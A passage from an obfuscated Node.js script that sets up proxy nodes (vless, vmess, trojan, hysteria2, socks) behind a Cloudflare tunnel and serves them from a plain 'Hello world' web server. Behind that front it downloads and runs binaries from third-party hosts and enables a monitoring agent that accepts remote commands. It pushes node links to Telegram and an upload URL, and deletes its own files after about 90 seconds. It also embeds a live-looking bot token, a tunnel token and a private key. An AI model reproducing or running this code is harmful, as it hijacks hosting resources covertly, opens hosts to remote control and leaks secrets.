              : await exec('pkill\x20-f\x20\x22[' + botName[_0x5af612(0x15b)](0x0) + ']' + botName[_0x5af612(0x176)](0x1) + _0x5af612(0x102))
          } catch (_0x2338ba) {}
        }
        ;(_0x241b27(), await new Promise((_0x5898bc) => setTimeout(_0x5898bc, 0xbb8)))
        const _0x1a7e0c =
          _0x16e7e8(0x183) + path[_0x16e7e8(0x141)](bootLogPath) + '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:' + ARGO_PORT
        try {
          ;(await exec('nohup\x20\x22' + path['resolve'](botPath) + '\x22\x20' + _0x1a7e0c + _0x16e7e8(0x16a)),
            console['log'](botName + _0x16e7e8(0xd8)),
            await new Promise((_0x479ef2) => setTimeout(_0x479ef2, 0x1770)),
            await extractDomains())
        } catch (_0xb7d63d) {
          console[_0x16e7e8(0x101)](_0x16e7e8(0x11b) + _0xb7d63d)
        }
      }
    } catch (_0x168e4a) {
      console[_0x16e7e8(0x101)](_0x16e7e8(0x19a), _0x168e4a)
    }
}
async function getMetaInfo() {
  const _0x56dd77 = _0x5e45e7
  try {
    const _0xaf6429 = await axios[_0x56dd77(0x130)](_0x56dd77(0xa4), { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 0xbb8 } })
    if (_0xaf6429['data'] && _0xaf6429[_0x56dd77(0x149)][_0x56dd77(0x189)] && _0xaf6429[_0x56dd77(0x149)][_0x56dd77(0x120)])
      return (_0xaf6429[_0x56dd77(0x149)][_0x56dd77(0x189)] + '-' + _0xaf6429[_0x56dd77(0x149)]['isp'])[_0x56dd77(0xf6)](/\s+/g, '_')
  } catch (_0x34830a) {
    try {
      const _0x132d74 = await axios[_0x56dd77(0x130)](_0x56dd77(0x122), { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 0xbb8 } })
      if (
        _0x132d74[_0x56dd77(0x149)] &&
        _0x132d74['data'][_0x56dd77(0xcd)] === _0x56dd77(0x10f) &&
        _0x132d74['data'][_0x56dd77(0x10d)] &&
        _0x132d74[_0x56dd77(0x149)][_0x56dd77(0x184)]
      )
        return (_0x132d74[_0x56dd77(0x149)][_0x56dd77(0x10d)] + '-' + _0x132d74[_0x56dd77(0x149)][_0x56dd77(0x184)])[_0x56dd77(0xf6)](/\s+/g, '_')
    } catch (_0x464bfd) {}
  }
  return _0x56dd77(0x9c)
}
async function getServerIP() {
  const _0x368fa7 = _0x5e45e7
  let _0x525548 = ''
  try {
    const _0x596f09 = await axios[_0x368fa7(0x130)]('http://ipv4.ip.sb', { timeout: 0xbb8 })
    _0x525548 = _0x596f09[_0x368fa7(0x149)]['trim']()
  } catch (_0x1bf86c) {
    try {
      _0x525548 = execSync(_0x368fa7(0x156))[_0x368fa7(0x91)]()[_0x368fa7(0x12e)]()
    } catch (_0x637360) {
      try {
        const _0xbf0809 = await axios[_0x368fa7(0x130)](_0x368fa7(0x1a7), { timeout: 0xbb8 })
        _0x525548 = '[' + _0xbf0809['data'][_0x368fa7(0x12e)]() + ']'
      } catch (_0x598f5c) {
        try {
          _0x525548 = '[' + execSync(_0x368fa7(0xd1))[_0x368fa7(0x91)]()[_0x368fa7(0x12e)]() + ']'
        } catch (_0x5382d4) {
          console['error']('Failed\x20to\x20get\x20IP\x20address:', _0x5382d4[_0x368fa7(0xb6)])
        }
      }
    }
  }
  return _0x525548
}
async function generateLinks(_0xc40f2c) {
  const _0x490e47 = await getMetaInfo(),
    _0x4dde94 = NAME ? NAME + '-' + _0x490e47 : _0x490e47,
    _0x2381e8 = await getServerIP()
  return new Promise((_0x83df0) => {
    setTimeout(() => {
      const _0x1d71aa = _0x49ed,
        _0x582f61 = {
          v: '2',
          ps: '' + _0x4dde94,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: _0x1d71aa(0x179),
          net: 'ws',
          type: _0x1d71aa(0x12b),
          host: _0xc40f2c,
          path: _0x1d71aa(0xa5),
          tls: 'tls',
          sni: _0xc40f2c,
          alpn: '',
          fp: _0x1d71aa(0xcf)
        }
      let _0x413970 =
        _0x1d71aa(0xd6) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        '?encryption=none&security=tls&sni=' +
        _0xc40f2c +
        _0x1d71aa(0xb2) +
        _0xc40f2c +
        '&path=%2Fvless-argo%3Fed%3D2560#' +
        _0x4dde94 +
        _0x1d71aa(0xe1) +
        Buffer[_0x1d71aa(0x18f)](JSON[_0x1d71aa(0xff)](_0x582f61))[_0x1d71aa(0x91)](_0x1d71aa(0x16f)) +
        _0x1d71aa(0x162) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        '?security=tls&sni=' +
        _0xc40f2c +
        _0x1d71aa(0xb2) +
        _0xc40f2c +
        '&path=%2Ftrojan-argo%3Fed%3D2560#' +
        _0x4dde94 +
        _0x1d71aa(0xea)
      if (isValidPort(HY2_PORT)) {
        const _0x10948c = getCertificateFingerprint(certPath),
          _0x4dd3b5 = _0x10948c ? _0x1d71aa(0x168) + encodeURIComponent(_0x10948c) : '',
          _0xdb2f42 = _0x1d71aa(0x1a0) + UUID + '@' + _0x2381e8 + ':' + HY2_PORT + _0x1d71aa(0x153) + _0x4dd3b5 + '#' + _0x4dde94
        _0x413970 += _0xdb2f42
      }
      if (isValidPort(REALITY_PORT)) {
        const _0x8da17a = _0x1d71aa(0xd6) + UUID + '@' + _0x2381e8 + ':' + REALITY_PORT + _0x1d71aa(0xef) + publicKey + _0x1d71aa(0x169) + _0x4dde94
        _0x413970 += _0x8da17a
      }
      if (isValidPort(S5_PORT)) {
        const _0x484054 = Buffer[_0x1d71aa(0x18f)](UUID[_0x1d71aa(0x176)](0x0, 0x8) + ':' + UUID[_0x1d71aa(0x8e)](-0xc))[_0x1d71aa(0x91)]('base64'),
          _0x6a9c54 = _0x1d71aa(0xc5) + _0x484054 + '@' + _0x2381e8 + ':' + S5_PORT + '#' + _0x4dde94
        _0x413970 += _0x6a9c54
      }
      ;(console['log'](Buffer[_0x1d71aa(0x18f)](_0x413970)[_0x1d71aa(0x91)](_0x1d71aa(0x16f))),
        fs[_0x1d71aa(0x100)](subPath, Buffer['from'](_0x413970)[_0x1d71aa(0x91)](_0x1d71aa(0x16f))),
        fs[_0x1d71aa(0x100)](listPath, _0x413970, _0x1d71aa(0xb1)),
        console['log'](FILE_PATH + _0x1d71aa(0x9e)),
        (subContent = Buffer['from'](_0x413970)[_0x1d71aa(0x91)](_0x1d71aa(0x16f))),
        uploadNodes(),
        _0x83df0(_0x413970))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x1ada4d = _0x5e45e7
  if (UPLOAD_URL) {
    if (!fs[_0x1ada4d(0xc6)](listPath)) return
    const _0x23098d = fs[_0x1ada4d(0xd4)](listPath, 'utf-8'),
      _0x28817c = _0x23098d[_0x1ada4d(0xa6)]('\x0a')[_0x1ada4d(0x114)]((_0x49eb38) =>
        /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x1ada4d(0xf0)](_0x49eb38)
      )
    if (_0x28817c['length'] === 0x0) return
    const _0x2bc126 = JSON[_0x1ada4d(0xff)]({ nodes: _0x28817c })
    try {
      const _0x1a6a3c = await axios[_0x1ada4d(0x117)](UPLOAD_URL + _0x1ada4d(0xd2), _0x2bc126, { headers: { 'Content-Type': _0x1ada4d(0x18d) } })
      return _0x1a6a3c && _0x1a6a3c[_0x1ada4d(0xcd)] === 0xc8 ? (console['log'](_0x1ada4d(0x137)), _0x1a6a3c) : null
    } catch (_0x16a954) {
      return null
    }
  } else return
}
function cleanFiles() {
  setTimeout(() => {
    const _0x194dbf = _0x49ed,
      _0x346d6c = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0x346d6c[_0x194dbf(0x15e)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0x346d6c[_0x194dbf(0x15e)](phpPath)
    process[_0x194dbf(0x14d)] === _0x194dbf(0xf5)
      ? exec(_0x194dbf(0xab) + _0x346d6c['join']('\x20') + '\x20>\x20nul\x202>&1', (_0x52b48b) => {
          const _0xb32ea5 = _0x194dbf
          ;(console[_0xb32ea5(0x1a8)](), alwaysLog(_0xb32ea5(0xa2)), console[_0xb32ea5(0x121)](_0xb32ea5(0x115)))
        })
      : exec(_0x194dbf(0xbc) + _0x346d6c[_0x194dbf(0xc2)]('\x20') + _0x194dbf(0xca), (_0x29553d) => {
          const _0x1f91fc = _0x194dbf
          ;(console[_0x1f91fc(0x1a8)](), alwaysLog(_0x1f91fc(0xa2)), console['log'](_0x1f91fc(0x115)))
        })
  }, 0x15f90)
}
cleanFiles()
function _0x3f3f() {
  const _0x157f16 = [
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a',
    '\x20in\x20clouudflare',
    's5-in',
    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
    'join',
    'crypto',
    'PrivateKey:\x20',
    '\x0asocks://',
    'existsSync',
    'tunnel.yml',
    '600982abvERh',
    'openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22',
    '\x20>/dev/null\x202>&1',
    'UPLOAD_URL',
    'write',
    'status',
    'vless-fallback-in',
    'firefox',
    'random',
    'curl\x20-sm\x203\x20ipv6.ip.sb',
    '/api/add-nodes',
    'sha256',
    'readFileSync',
    'unlink',
    '\x0avless://',
    'hysteria',
    '\x20is\x20running',
    'NEZHA_KEY',
    '/v1',
    'mkdirSync',
    '\x0aPublicKey:\x20',
    '\x0a\x20\x20credentials-file:\x20',
    'REALITY_PORT',
    'isFile',
    'Download\x20',
    '\x0a\x0avmess://',
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a',
    '127.0.0.1',
    'ignore',
    'vless',
    'Error\x20in\x20startserver:',
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
    '2111692RVzIir',
    '.npm',
    '\x0a\x20\x20\x20\x20',
    '9yVztAL',
    'Retrying\x20',
    'Not\x20Found',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=',
    'test',
    'arm',
    'quic',
    'now',
    '1437705NvPxWF',
    'win32',
    'replace',
    '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
    'dirname',
    'env',
    'Failed\x20to\x20send\x20Telegram\x20message:',
    'tunnel.json',
    '1116498AofXee',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
    'Private\x20Key:',
    'stringify',
    'writeFileSync',
    'error',
    '\x22\x20>\x20/dev/null\x202>&1',
    'tls',
    'axios',
    'mfa.gov.ua',
    'end',
    '/trojan-argo',
    'true',
    'inbounds',
    '/bot',
    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
    'countryCode',
    'arm64',
    'success',
    '2096',
    '-----BEGIN\x20CERTIFICATE-----\x0a',
    'toLowerCase',
    'web\x20running\x20error:\x20',
    'filter',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    'fileName',
    'post',
    '1352104SvIbae',
    'https://amd64.oooen.com',
    'base64url',
    'Error\x20executing\x20command:\x20',
    '/agent',
    'TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG',
    'SHOW_LOG',
    'aarch64',
    'isp',
    'log',
    'http://ip-api.com/json',
    '-----END\x20EC\x20PARAMETERS-----\x0a',
    'match',
    'https://api.telegram.org/bot',
    'forEach',
    '/dev/null',
    'ARGO_DOMAIN:',
    'npm\x20running\x20error:\x20',
    'hysteria-in',
    'none',
    'freedom',
    '/config.json\x20>/dev/null\x202>&1\x20&',
    'trim',
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a',
    'get',
    'nohup\x20',
    'update',
    '800',
    'NEZHA_SERVER',
    'text/plain;\x20charset=utf-8',
    'http',
    'Nodes\x20uploaded\x20successfully',
    'https://arm64.ssss.nyc.mn',
    'password',
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a',
    'fileUrls',
    'xtls-rprx-vision',
    'https://arm64.oooen.com',
    'pop',
    'includes',
    'catch',
    'resolve',
    'writeHead',
    'http\x20server\x20is\x20running\x20on\x20',
    '\x20-c\x20\x22',
    '/web',
    'vmess-ws-in',
    'path',
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'data',
    'CHAT_ID',
    'FILE_PATH',
    '7HjXRVn',
    'platform',
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
    'subarray',
    '.exe\x20>\x20nul\x202>&1',
    '/vmess-argo',
    'basename',
    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
    'x25519',
    'MarkdownV2',
    'curl\x20-sm\x203\x20ipv4.ip.sb',
    'map',
    'Error\x20downloading\x20files:',
    '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
    '8443',
    'charAt',
    'NEZHA\x20variable\x20is\x20empty,skip\x20running',
    '2087',
    'push',
    'false',
    'sub.txt',
    '.download',
    '\x0a\x0atrojan://',
    'amd',
    'private.key',
    'createServer',
    '\x20from\x20backup\x20source',
    '\x22\x20run',
    '&pinSHA256=',
    '&type=tcp&headerType=none#',
    '\x20>/dev/null\x202>&1\x20&',
    'floor',
    'string',
    'direct',
    'utf-8',
    'base64',
    'pkcs8',
    'UUID',
    '2053',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    'close',
    '\x0aclient_secret:\x20',
    'substring',
    'stream',
    'cert.pem',
    'auto',
    '\x20-p\x20',
    'https+local://8.8.8.8/dns-query',
    'php\x20running\x20error:\x20',
    'BggqhkjOPQMBBw==\x0a',
    'has',
    'proxy',
    'tcp',
    'then',
    'reality',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
    'org',
    '\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',
    '7575949494',
    'trojan-ws-in',
    'unshift',
    'country_code',
    'vless-ws-in',
    'Telegram\x20message\x20sent\x20successfully',
    '1152730qDCYFa',
    'application/json',
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
    'from',
    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
    'spki',
    'PORT',
    'statSync',
    '4d70c2f2-caa4-4d12-be8f-e2530036a5a0',
    'toUpperCase',
    '\x22\x20-subj\x20\x22/CN=bing.com\x22',
    'all',
    'boot.log',
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiNzgyYThhMjQtYzU0YS00ZGMyLThmMTUtMGE2YTFkYzc2NzZjIiwicyI6Ik56UTJNREJtWVdJdFlXWXpNQzAwTldFMkxXSTNOMk10TUdZNU0yWXpOVEUxWW1NeiJ9',
    'Error\x20reading\x20boot.log:',
    '\x20-s\x20',
    'arch',
    '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20',
    '\x22\x20-out\x20\x22',
    'CFPORT',
    '\x0ahysteria2://',
    '--tls',
    'NEZHA_PORT',
    'ARGO_DOMAIN',
    '\x20-c\x20',
    '\x20failed:\x20',
    'ARGO_AUTH',
    'http://ipv6.ip.sb',
    'clear',
    '2083',
    '/sendMessage',
    'listen',
    'Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.',
    '462363aEdqLQ',
    'chmodSync',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
    '```',
    'SUB_PATH',
    '\x0a\x20\x20tunnel:\x20',
    '\x20successfully',
    'www.iij.ad.jp:443',
    'blackhole',
    'createHash',
    'slice',
    'der',
    'HY2_PORT',
    'toString',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'Public\x20Key:',
    'vless-tcp-in',
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'Failed\x20to\x20calculate\x20certificate\x20fingerprint:',
    'disable',
    'taskkill\x20/f\x20/im\x20',
    'stdout',
    'https://bing.com',
    'generateKeyPairSync',
    'Unknown',
    'Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20',
    '/sub.txt\x20saved\x20successfully',
    'trojan',
    'vless-in',
    'Empowerment\x20success\x20for\x20',
    'App\x20is\x20running',
    'block',
    'https://api.ip.sb/geoip',
    '/vmess-argo?ed=2560',
    'split',
    'unlinkSync',
    '8PZDoaX',
    'northflank.933993.xyz',
    'key.txt',
    'del\x20/f\x20/q\x20',
    'CFIP',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    'list.txt',
    'openssl\x20version',
    'www.iij.ad.jp',
    'utf8',
    '&fp=firefox&type=ws&host=',
    'length',
    'index.html',
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
    'message',
    '/vless-argo',
    'privateKey',
    'config.json',
    '-----END\x20CERTIFICATE-----\x0a',
    'Unhandled\x20error\x20in\x20startserver:',
    'rm\x20-rf\x20'
  ]
  _0x3f3f = function () {
    return _0x157f16
  }
  return _0x3f3f()
}
async function sendTelegram() {
  const _0x2f67ab = _0x5e45e7
  if (!BOT_TOKEN || !CHAT_ID) {
    console[_0x2f67ab(0x121)](_0x2f67ab(0x11d))
    return
  }
  try {
    const _0xc61d2f = fs['readFileSync'](subPath, 'utf8'),
      _0x2c7ad2 = _0x2f67ab(0x125) + BOT_TOKEN + _0x2f67ab(0x1aa),
      _0x45cdcb = NAME[_0x2f67ab(0xf6)](/[_*\[\]()~`>#+=|{}.!-]/g, '\x5c$&'),
      _0x3134c6 = { chat_id: CHAT_ID, text: '**' + _0x45cdcb + '节点推送**\x0a```' + _0xc61d2f + _0x2f67ab(0x1b0), parse_mode: _0x2f67ab(0x155) }
    ;(await axios[_0x2f67ab(0x117)](_0x2c7ad2, null, { params: _0x3134c6 }), console[_0x2f67ab(0x121)](_0x2f67ab(0x18b)))
  } catch (_0x6859de) {
    console['error'](_0x2f67ab(0xfa), _0x6859de[_0x2f67ab(0xb6)])
  }
}
async function startserver() {
  const _0x3f70ae = _0x5e45e7
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram())
  } catch (_0x2153ba) {
    console[_0x3f70ae(0x101)](_0x3f70ae(0xe6), _0x2153ba)
  }
}
startserver()[_0x5e45e7(0x140)]((_0x15d92a) => {
  const _0x4a7e9a = _0x5e45e7
  console['error'](_0x4a7e9a(0xbb), _0x15d92a)
})
const server = http[_0x5e45e7(0x165)](async (_0x1f4dda, _0x9fcc79) => {
  const _0x1ce1bc = _0x5e45e7,
    _0x135b9a = _0x1f4dda['url'][_0x1ce1bc(0xa6)]('?')[0x0]
  if (_0x135b9a === '/' + SUB_PATH) {
    if (subContent) (_0x9fcc79['writeHead'](0xc8, { 'Content-Type': _0x1ce1bc(0x135) }), _0x9fcc79['end'](subContent))
    else
      try {
        const _0x104799 = fs['readFileSync'](subPath, 'utf-8')
        ;(_0x9fcc79[_0x1ce1bc(0x142)](0xc8, { 'Content-Type': _0x1ce1bc(0x135) }), _0x9fcc79[_0x1ce1bc(0x106)](_0x104799))
      } catch (_0x33159b) {
        ;(_0x9fcc79[_0x1ce1bc(0x142)](0x1f7, { 'Content-Type': _0x1ce1bc(0x135) }), _0x9fcc79[_0x1ce1bc(0x106)](_0x1ce1bc(0x1ac)))
      }
    return
  }
  if (_0x135b9a === '/') {
    try {
      const _0x4b40a3 = path['join'](__dirname, _0x1ce1bc(0xb4)),
        _0x52b681 = await fs['promises']['readFile'](_0x4b40a3, _0x1ce1bc(0xb1))
      ;(_0x9fcc79[_0x1ce1bc(0x142)](0xc8, { 'Content-Type': 'text/html;\x20charset=utf-8' }), _0x9fcc79[_0x1ce1bc(0x106)](_0x52b681))
    } catch (_0x4972bf) {
      ;(_0x9fcc79[_0x1ce1bc(0x142)](0xc8, { 'Content-Type': 'text/html;\x20charset=utf-8' }),
        _0x9fcc79[_0x1ce1bc(0x106)]('Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!'))
    }
    return
  }
  ;(_0x9fcc79[_0x1ce1bc(0x142)](0x194, { 'Content-Type': _0x1ce1bc(0x135) }), _0x9fcc79['end'](_0x1ce1bc(0xed)))
})
server[_0x5e45e7(0x1ab)](PORT, () => alwaysLog(_0x5e45e7(0x143) + PORT + '!'))
